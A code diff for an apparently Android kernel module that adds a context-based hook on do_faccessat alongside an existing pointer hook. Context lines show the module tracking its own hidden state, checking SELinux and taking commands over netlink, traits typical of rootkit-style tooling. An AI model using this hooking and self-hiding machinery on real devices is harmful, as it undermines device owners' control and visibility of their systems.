@@ -51,8 +51,19 @@ static struct nvk_nl_sock nl_sock;
 static struct task_struct *worker_thread;
 static volatile int worker_running;
 
-typedef int (*faccessat_fn)(int dfd, const char __user *filename,
-			    int mode, int flags);
+#ifdef NVK_CONTEXT_HOOK
+
+static struct nvk_hook_ctx faccessat_ctx;
+
+static void hook_faccessat_ctx(nvk_reg_ctx *ctx)
+{
+	(void)ctx;
+}
+
+#else
+
+typedef long (*faccessat_fn)(int dfd, const char __user *filename,
+			     int mode, int flags);
 static struct nvk_hook faccessat_hook;
 static faccessat_fn orig_do_faccessat;
 
@@ -66,6 +77,8 @@ static long hook_do_faccessat(int dfd, const char __user *filename,
 	nvk_hook_leave(&faccessat_hook);
 	return ret;
 }
+
+#endif
 
 static int worker_fn(void *data)
 {
@@ -95,7 +108,11 @@ static void nl_handler(struct nvk_nl_sock *ns, u32 pid,
 		sr.kernel_minor = ki->minor;
 		sr.android_ver = ki->android_version;
 		sr.hidden = nvk_mod_is_hidden(&hide_state);
+#ifdef NVK_CONTEXT_HOOK
+		sr.hooks_active = faccessat_ctx.base.active;
+#else
 		sr.hooks_active = faccessat_hook.active;
+#endif
 		sr.selinux_enforcing = nvk_selinux_is_enforcing();
 		sr.thread_count = nvk_thread_active_count();
 		sr.has_pac = nvk_has_pac();
@@ -144,7 +161,11 @@ static void nl_handler(struct nvk_nl_sock *ns, u32 pid,
 	}
 
 	case CMD_HOOK_STATS: {
+#ifdef NVK_CONTEXT_HOOK
+		u64 hits = nvk_hook_hits(&faccessat_ctx.base);
+#else
 		u64 hits = nvk_hook_hits(&faccessat_hook);
+#endif
 		nvk_nl_reply(ns, pid, seq, &hits, sizeof(hits));
 		break;
 	}
@@ -241,9 +262,14 @@ static int nvk_full_init(void)
 
 	target = NVK_LOOKUP("do_faccessat");
 	if (target) {
+#ifdef NVK_CONTEXT_HOOK
+		ret = nvk_hook_install_ctx(&faccessat_ctx, target,
+					    hook_faccessat_ctx, (void *)0);
+#else
 		ret = nvk_hook_install(&faccessat_hook, target,
 				       (void *)hook_do_faccessat,
 				       (void **)&orig_do_faccessat);
+#endif
 		if (ret == 0)
 			nvk_log_info("faccessat hooked\n");
 	}
@@ -282,8 +308,13 @@ static void nvk_full_exit(void)
 	if (worker_thread)
 		nvk_thread_stop(worker_thread);
 
+#ifdef NVK_CONTEXT_HOOK
+	if (faccessat_ctx.base.active)
+		nvk_hook_remove_ctx(&faccessat_ctx);
+#else
 	if (faccessat_hook.active)
 		nvk_hook_remove(&faccessat_hook);
+#endif
 
 	_nvk_hide_cleanup(&hide_state, &__this_module);
 
